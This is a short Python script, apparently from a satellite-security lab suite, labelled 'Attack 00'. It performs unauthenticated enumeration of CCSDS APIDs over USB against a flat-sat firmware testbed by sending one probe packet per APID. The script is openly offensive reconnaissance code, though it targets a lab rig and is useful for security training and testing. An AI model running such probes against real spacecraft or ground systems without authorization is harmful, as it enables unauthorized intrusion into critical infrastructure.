#!/usr/bin/env python3
"""
Attack 00: Unauthenticated Black-Box APID Enumeration (USB Variant)
Scans CCSDS APID space (0x00 to 0x1F) against flat-sat-fw-interno.
"""
import os
import sys
import time

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "../lib")))
from flatsat_usb import FlatSatUSB
from pwnsat_packets import build_ccsds_packet

def main():
    print("[+] Attack 00: APID Enumeration (flat-sat-fw-interno USB Variant)")
    usb = FlatSatUSB()
    if not usb.connect():
        print("[X] Failed to connect to FlatSat USB port.")
        sys.exit(1)

    print("[*] Scanning APIDs 0x00 to 0x1F over USB serial...")
    for apid in range(0x00, 0x20):
        packet = build_ccsds_packet(apid=apid, payload=b"\x00")
        print(f" -> Testing APID 0x{apid:02X}...")
        usb.send_raw(packet)
        time.sleep(0.1)

    print("[✓] APID Enumeration complete.")
    usb.close()

if __name__ == "__main__":
    main()
